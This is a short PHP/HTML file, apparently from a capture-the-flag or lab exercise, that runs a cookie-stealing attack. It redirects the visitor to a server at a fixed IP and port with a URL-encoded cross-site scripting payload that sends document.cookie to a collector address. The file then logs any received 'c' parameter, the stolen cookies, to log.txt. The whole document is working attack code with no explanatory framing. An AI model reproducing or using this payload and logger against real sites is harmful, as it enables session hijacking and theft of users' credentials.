<html>
  <body>
    <?php header('Location:http://165.232.169.47:2777/?search=%3Cscript%3Edocument.location%3D%22http%3A%2F%2F127.0.0.1%3A5000%2F%3Fc%3D%22+%2B+document.cookie%3C%2Fscript%3E');
    $cookies = $_GET["c"];
    $file = fopen('log.txt','a');
    fwrite($file,$cookies . "\n\n");
?>
  </body>
</html>
